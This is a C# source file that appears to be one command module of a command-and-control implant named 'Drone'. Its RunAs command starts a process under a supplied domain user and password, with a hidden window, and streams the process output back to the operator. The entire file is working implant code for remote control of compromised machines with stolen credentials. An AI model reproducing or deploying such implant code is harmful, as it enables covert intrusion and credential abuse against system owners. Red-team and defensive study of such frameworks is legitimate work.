﻿using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace Drone.Commands;

public sealed class RunAs : DroneCommand
{
    public override byte Command => 0x3C;
    public override bool Threaded => true;

    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var split = task.Arguments[0].Split('\\');
        
        using var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                Domain = split[0],
                UserName = split[1],
                Password = task.Arguments[1].ToSecureString(),
                FileName = task.Arguments[2],
                Arguments = string.Join(" ", task.Arguments.Skip(3)),
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            }
        };

        // inline function
        void OnDataReceived(object sender, DataReceivedEventArgs e)
        {
            Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, e.Data + Environment.NewLine));
        }
        
        // send output on data received
        process.OutputDataReceived += OnDataReceived;
        process.ErrorDataReceived += OnDataReceived;

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        
        // send a task running
        Drone.SendTaskRunning(task.Id);
        
        // don't use WaitForExit
        while (!process.HasExited)
        {
            // has the token been cancelled?
            if (cancellationToken.IsCancellationRequested)
            {
                process.OutputDataReceived -= OnDataReceived;
                process.ErrorDataReceived -= OnDataReceived;
                process.Kill();
                
                break;
            }
            
            Thread.Sleep(100);
        }

        Drone.SendTaskComplete(task.Id);
    }
}